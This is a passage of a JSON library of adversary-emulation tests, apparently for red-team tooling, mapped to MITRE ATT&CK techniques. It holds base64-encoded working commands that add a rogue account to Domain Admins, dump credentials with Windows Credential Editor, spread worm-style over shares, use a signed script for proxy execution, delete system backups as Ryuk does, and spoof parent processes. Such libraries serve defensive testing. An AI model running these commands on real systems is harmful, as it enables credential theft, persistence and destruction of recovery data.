"cleanup": [], "executor": "cmd", "access": {}, "description": "Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.\n", "variations": []}, {"test": "JHggPSBHZXQtUmFuZG9tIC1NaW5pbXVtIDIgLU1heGltdW0gOTk7ICR5ID0gR2V0LVJhbmRvbSAtTWluaW11bSAyIC1NYXhpbXVtIDk5OyAkeiA9IEdldC1SYW5kb20gLU1pbmltdW0gMiAtTWF4aW11bSA5OTsgJHcgPSBHZXQtUmFuZG9tIC1NaW5pbXVtIDIgLU1heGltdW0gOTk7IDsgSW1wb3J0LU1vZHVsZSBBY3RpdmVEaXJlY3Rvcnk7ICRhY2NvdW50ID0gIiN7YWNjb3VudF9wcmVmaXh9LSR4JHkkeiI7IE5ldy1BRFVzZXIgLU5hbWUgJGFjY291bnQgLUdpdmVuTmFtZSAiVGVzdCIgLURpc3BsYXlOYW1lICRhY2NvdW50IC1TYW1BY2NvdW50TmFtZSAkYWNjb3VudCAtU3VybmFtZSAkYWNjb3VudCAtRW5hYmxlZDokRmFsc2UgI3tjcmVhdGVfYXJnc307IEFkZC1BREdyb3VwTWVtYmVyICIje2dyb3VwfSIgJGFjY291bnQ=", "ability_id": "d59ecb9057d23777ef404acc2ecc73cc", "technique_name": "Account Manipulation", "additional_info": {}, "privilege": "", "technique_id": "T1098", "platform": "windows", "name": "Domain Account and Group Manipulate", "requirements": [], "tactic": "persistence", "buckets": ["persistence"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["R2V0LUFEVXNlciAtTERBUEZpbHRlciAiKCYoc2FtYWNjb3VudG5hbWU9YXRyLS0qKShnaXZlbk5hbWU9VGVzdCkpIiB8IFJlbW92ZS1BRFVzZXIgLUNvbmZpcm06JEZhbHNl"], "executor": "psh", "access": {}, "description": "Create a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). \n\nThe quickest way to run it is against a domain controller, using `-Session` of `Invoke-AtomicTest`. Alternatively,\nyou need to install PS Module ActiveDirectory (in prereqs) and run the script with appropriare AD privileges to \ncreate the user and alter the group. Automatic installation of the dependency requires an elevated session, \nand is unlikely to work with Powershell Core (untested).\n\nIf you consider running this test against a production Active Directory, the good practise is to create a dedicated\nservice account whose delegation is given onto a dedicated OU for user creation and deletion, as well as delegated\nas group manager of the target group.\n\nExample: `Invoke-AtomicTest -Session $session 'T1098' -TestNames \"Domain Account and Group Manipulate\" -InputArgs @{\"group\" = \"DNSAdmins\" }`\n", "variations": []}, {"test": "UGF0aFRvQXRvbWljc0ZvbGRlclxUMTAwMy4wMDFcYmluXHdjZS5leGUgLW8gJXRlbXAlXHdjZS1vdXRwdXQudHh0", "ability_id": "9b06cebb28a9f13dc5f739649de0042c", "technique_name": "OS Credential Dumping: LSASS Memory", "additional_info": {}, "privilege": "", "technique_id": "T1003.001", "platform": "windows", "name": "Windows Credential Editor", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICIldGVtcCVcd2NlLW91dHB1dC50eHQiID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Dump user credentials using Windows Credential Editor (supports Windows XP, 2003, Vista, 7, 2008 and Windows 8 only)\n\nUpon successful execution, you should see a file with user passwords/hashes at %temp%/wce-output.file.\n\nIf you see no output it is likely that execution was blocked by Anti-Virus. \n\nIf you see a message saying \\\"wce.exe is not recognized as an internal or external command\\\", try using the  get-prereq_commands to download and install Windows Credential Editor first.\n", "variations": []}, {"test": "cHVzaGQgXFxsb2NhbGhvc3RcQyQgJiYgZWNobyB2YXIgZmlsZU9iamVjdCA9IFdTY3JpcHQuY3JlYXRlb2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpO3ZhciBuZXdmaWxlID0gZmlsZU9iamVjdC5DcmVhdGVUZXh0RmlsZSgiQXRvbWljVGVzdEZpbGVUMTEwNS5qcyIsIHRydWUpO25ld2ZpbGUuV3JpdGVMaW5lKCJUaGlzIGlzIGFuIGF0b21pYyByZWQgdGVhbSB0ZXN0IGZpbGUgZm9yIFQxMTA1LiBJdCBzaW11bGF0ZXMgaG93IE9TVGFwIHdvcm1zIGFjY3Jvc3MgbmV0d29yayBzaGFyZXMgYW5kIGRyaXZlcy4iKTtuZXdmaWxlLkNsb3NlKCk7ID4gQXRvbWljVGVzdFQxMTA1LmpzICYmIENTY3JpcHQuZXhlIEF0b21pY1Rlc3RUMTEwNS5qcyAvL0U6SlNjcmlwdCAmJiBkZWwgQXRvbWljVGVzdFQxMTA1LmpzIC9RID5udWwgMj4mMSAmJiBkZWwgQXRvbWljVGVzdEZpbGVUMTEwNS5qcyAvUSA+bnVsIDI+JjEgJiYgcG9wZA==", "ability_id": "c9f7fc4ddd374ede126a78bff283fa4d", "technique_name": "Ingress Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1105", "platform": "windows", "name": "OSTAP Worming Activity", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.\n", "variations": []}, {"test": "c2V0IGNvbXNwZWM9JXdpbmRpciVcU3lzdGVtMzJcY2FsYy5leGUgJiYgY3NjcmlwdCAld2luZGlyJVxTeXN0ZW0zMlxtYW5hZ2UtYmRlLndzZg==", "ability_id": "69610799696d583f0ff816143f80ed62", "technique_name": "Signed Script Proxy Execution", "additional_info": {}, "privilege": "", "technique_id": "T1216", "platform": "windows", "name": "manage-bde.wsf Signed Script Command Execution", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["c2V0IGNvbXNwZWM9JXdpbmRpciVcU3lzdGVtMzJcY21kLmV4ZQ=="], "executor": "cmd", "access": {}, "description": "Executes the signed manage-bde.wsf script with options to execute an arbitrary command.\n", "variations": []}, {"test": "ZGVsIC9zIC9mIC9xIGM6XCouVkhEIGM6XCouYmFjIGM6XCouYmFrIGM6XCoud2JjYXQgYzpcKi5ia2YgYzpcQmFja3VwKi4qIGM6XGJhY2t1cCouKiBjOlwqLnNldCBjOlwqLndpbiBjOlwqLmRzaw==", "ability_id": "5a9a7d8b4f632652c3ed175c071c5c7a", "technique_name": "Inhibit System Recovery", "additional_info": {}, "privilege": "", "technique_id": "T1490", "platform": "windows", "name": "Windows - Delete Backup Files", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many \"access is denied\" messages will appear as the commands try\nto delete files from around the system.\n", "variations": []}, {"test": "R2V0LUNpbUluc3RhbmNlIC1DbGFzc05hbWUgV2luMzJfUHJvY2VzcyAtUHJvcGVydHkgTmFtZSwgQ29tbWFuZExpbmUsIFByb2Nlc3NJZCAtRmlsdGVyICJOYW1lID0gJ3N2Y2hvc3QuZXhlJyBBTkQgQ29tbWFuZExpbmUgTElLRSAnJSciIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMSB8IFN0YXJ0LUFUSFByb2Nlc3NVbmRlclNwZWNpZmljUGFyZW50IC1GaWxlUGF0aCAkRW52OndpbmRpclxTeXN0ZW0zMlxXaW5kb3dzUG93ZXJTaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIC1Db21tYW5kTGluZSAnLUNvbW1hbmQgU3RhcnQtU2xlZXAgMTAn", "ability_id": "f1860f954826d24fd5283e2344adb836", "technique_name": "Access Token Manipulation: Parent PID Spoofing", "additional_info": {}, "privilege": "", "technique_id": "T1134.004", "platform": "windows", "name": "Parent PID Spoofing - Spawn from svchost.exe", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Spawnd a process as a child of the first accessible svchost.exe process.", "variations": []}, {"test": "Llx3aWZpLnBzMSAtUHJlZg==", "ability_id": "a0676fe1-cd52-482e-8dde-349b73f9aa69", "technique_name": "System Network Configuration Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1016", "platform": "windows", "name": "Preferred WIFI", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.wifipref", "relationships": [{"edge": "", "source": "wifi.network.ssid", "custom_parser_vals": {}, "target": ""}]}], "payloads": ["wifi.ps1"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJ3aWZpLnBzMSI="], "executor": "psh", "access": {}, "description": "See the most used WIFI networks of a machine", "variations": []}]